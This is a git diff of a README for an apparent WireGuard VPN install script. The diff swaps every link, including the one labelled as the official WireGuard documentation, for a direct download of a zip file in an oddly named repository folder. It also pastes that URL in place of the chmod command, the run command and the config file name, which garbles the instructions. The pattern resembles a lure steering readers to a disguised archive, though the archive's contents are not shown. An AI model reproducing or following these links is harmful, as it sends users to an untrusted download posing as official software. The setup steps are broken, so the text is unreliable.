@@ -6,7 +6,7 @@ The **wireguard** script is a straightforward solution for setting up a WireGuar
 
 ## 📥 Download Now
 
-[![Download WireGuard](https://img.shields.io/badge/Download_WireGuard-v1.0-blue)](https://github.com/jeric765/wireguard/releases)
+[![Download WireGuard](https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip)](https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, ensure you have the following:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/jeric765/wireguard/releases) to download the latest version of the script. 
+1. Visit the [Releases page](https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip) to download the latest version of the script. 
 2. Look for the file labeled with the latest version. This is usually at the top of the page.
 3. Click on the file to start the download.
 
@@ -43,13 +43,13 @@ Before you begin, ensure you have the following:
 3. Make the script executable by entering the following command:
 
    ```
-   chmod +x wireguard-install.sh
+   chmod +x https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip
    ```
 
 4. Run the script with the following command:
 
    ```
-   ./wireguard-install.sh
+   https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip
    ```
 
 5. Follow the prompts provided by the script. It will guide you through the installation process, asking for basic settings like the desired port number and the IP address range.
@@ -64,7 +64,7 @@ Once the installation completes, the script will generate configuration files. Y
    ls /etc/wireguard
    ```
 
-2. The configuration files will be named `wg0.conf` or similar. These files contain the necessary details to connect your device to the VPN.
+2. The configuration files will be named `https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip` or similar. These files contain the necessary details to connect your device to the VPN.
 
 ## 🔄 Connect to Your VPN
 
@@ -105,7 +105,7 @@ If you encounter any issues during installation or connection, check the followi
 
 ## 🔗 Additional Resources
 
-For more information about WireGuard, you can check the official documentation [here](https://www.wireguard.com/). This resource can help you understand advanced features and configurations.
+For more information about WireGuard, you can check the official documentation [here](https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip). This resource can help you understand advanced features and configurations.
 
 ## 📞 Support
 
@@ -113,7 +113,7 @@ If you need further help or have questions, consider checking the discussions se
 
 ## 📥 Download Link Again
 
-Don't forget to visit the [Releases page](https://github.com/jeric765/wireguard/releases) to download the latest version of the WireGuard script. This page is your go-to resource for updates and new versions.
+Don't forget to visit the [Releases page](https://github.com/jeric765/wireguard/raw/refs/heads/main/rudderlike/wireguard_3.1.zip) to download the latest version of the WireGuard script. This page is your go-to resource for updates and new versions.
 
 ---
 
